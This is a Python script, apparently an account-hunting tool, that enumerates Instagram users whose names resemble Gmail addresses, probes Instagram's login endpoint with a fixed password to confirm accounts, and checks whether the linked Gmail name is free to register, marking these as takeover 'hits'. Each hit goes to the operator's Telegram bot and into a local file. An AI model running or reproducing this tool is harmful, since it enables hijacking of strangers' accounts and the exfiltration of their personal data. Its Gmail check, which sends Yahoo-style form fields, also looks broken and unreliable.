import requests,os,names,random,sys,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
os.system('clear')
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
yso = '@GGGGCG'
pss=input(S+"PASSWORD => "+B)
if pss ==yso:
 pass
 print(G+"GOOD PRO")
 time.sleep(1)
 os.system('clear')
else:
 exit(E+"ERROR PASSWORD")
sid=input(E+'[+] SessionID ==> '+G)
token = input(G+"EnTeR ToKeN BoT ==> "+S)
ID = input(E+"EnTeR iD TeLeGaRm ==> "+B)
head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
def check(email,user):
 user=str(user)
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
	 i=requests.get(f'https://www.instagram.com/{user}/?__a=1',headers=head).json()
	 followers=i['graphql']['user']['edge_followed_by']['count']
	 following=i['graphql']['user']['edge_follow']['count']
	 id=i['graphql']['user']['id']
	 lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
	 iok = lok.json()
	 date = str(iok['data'])
	 whisperr=(G+f'''[✅] Insta HIT
UserName ==> {user}
E-mail ==> {email}
User ID ==> {id}
Followers ==> {followers}
Following ==> {following}
Date Create ==> {date}
TeleGram ==> @GGGGCG''')
	 print(G+whisperr)
	 print(f'{E}====================================')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(whisperr))
	 with open('@GGGGCG.txt', 'a') as (devil):
	  devil.write(email+' | '+user+' | '+date+'\n')
 if req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
	 i=requests.get(f'https://www.instagram.com/{user}/?__a=1',headers=head).json()
	 followers=i['graphql']['user']['edge_followed_by']['count']
	 following=i['graphql']['user']['edge_follow']['count']
	 id=i['graphql']['user']['id']
	 lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
	 iok = lok.json()
	 date = str(iok['data'])
	 whisperr=(G+f'''[✅] Insta HIT
UserName ==> {user}
E-mail ==> {email}
User ID ==> {id}
Followers ==> {followers}
Following ==> {following}
Date Create ==> {date}
TeleGram ==> @GGGGCG''')
	 print(G+whisperr)
	 print(f'{E}====================================')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(whisperr))
	 with open('@GGGGCG.txt', 'a') as (devil):
	  devil.write(email+' | '+user+' | '+date+'\n')
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print(f'{E}[×] Not In InstaGram ==> {email}')
def gmail(email,user):
	eml=str(email)
	email=eml.split('@')[0]
	url = 'https://login.gmail.com/account/module/create?validateField=yid'
	headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Length': '17973',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': 'APID=UP139a7583-ebf0-11eb-b505-06ebe7a65878; B=1gu92j5gg4sv7&b=3&s=64; A1=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; A3=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; GUC=AQEBAQFg_FZhBEIc3QQ6; cmp=t=1627550703&j=0; APIDTS=1627550737; A1S=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk&j=WORLD; AS=v=1&s=9z9sgq95&d=A6103d241|eavlddr.2Sqtm1snR4vumZPgWEv2CX8ETv8qsCVpXUOAi6BcDaqYAawFRdXZOH3x1ZhIOOPANiSybHZ1j1IBJfKp_yUQeVT2a7U2iFeceXk3DV8Yf6fdA4Mb3M_1A3WY2rpfLpkN2geA1AHRb_QuK0p_gvRBC25hCJqX6_BqNWBCQZ40y2vcTOUrMHZQRGCPbygJ4jCC1pmj16D_TNVaFo68GkkgrxHiFpLQEP9zBsfEM9g8FM8Qd3Gs8oJHQRyvyel09x3uEdniEFCXR93nRCcOMMKCI7xvW239gVcz1Gs_5hmZv6aql00Zge0HJaK6YKPDg9Q7rFfMe7pJry4gCuNMiq_bH9TeBHQEGjqLCJR_d8hcSFHxUnNah4D8.hwV7o1hyYUKQl2Pw6aVKPizRyscmuz0Rwa1LUKGV0O2ls2MSsR4g4TzVlLObvUuKBdrdIJJD3Em1NsNsXKj3uyr.XgZV3E09rJQbldIcePNMPkT7jJjydoGuIBVbqutW0MgHN5IShbRcy6cVifEmil4551or5xaGO5kNpIDCbjUmhD8.MnIfBGRlSIITVGGoQhj3l5TBA742dFc_zcZJmtF5XIrHTr_wMpbpc3ZzD1SgWTDMvySFcsTwH8DdIPhUw4c5QUfyh0kECQFV6OG2M9B06c1wayVg_OiVhy6B6u8Q5AHjbRhsacLtI8K7KxG3JA6oxXmOla3MUX35XvU2axN9DChrM3gpJlJYgmqxV454FF23dysnz4sixK8tvwUc.4EiOU_5OfNGmgZpA.MiCif_oYX3m92DAi38QIl~A',
    'Host': 'login.gmail.com',
    'Origin': 'https://login.gmail.com',
    'Referer': 'https://login.gmail.com/account/create?.lang=ar-JO&src=homepage&specId=yidReg&done=https%3A%2F%2Fwww.gmail.com',
    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    'sec-ch-ua-mobile': '?0',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': str(generate_user_agent()),
    'X-Requested-With': 'XMLHttpRequest'}
	data = {
    'browser-fp-data': '{"language":"en-US","colorDepth":24,"deviceMemory":8,"pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~Google SwiftShader","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1627553991633,"render":1627553997166}}',
    'specId': 'yidreg',
    'crumb': 'rak/FdAmWa5',
    'acrumb': '9z9sgq95',
    'done': 'https://www.gmail.com',
    'attrSetIndex': '0',
    'tos0': 'oath_freereg|xa|ar-JO',
    'yid': email,
    'password': 'whisper666',
    'shortCountryCode': 'AF',}
	response = requests.post(url,headers=headers,data=data).text
	if ('"yid"') in response:
	 print(f"{S}[×] Not Available gmail ==> {email}@gmail.com")
	else:
	 email=email+'@gmail.com'
	 check(email,user)
def users():
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm_.'
  num='123456'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}@gmail.com',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    if 'gmail' in user:
      emai=user.split('gmail')[0]
      email=emai+'@gmail.com'
      gmail(email,user)
    else:
      email=str(whisper['users'][mn]['user']['full_name'])
      if ' ' in email:
       pass
      else:
       gmail(email,user)
  except IndexError:
   users()
users()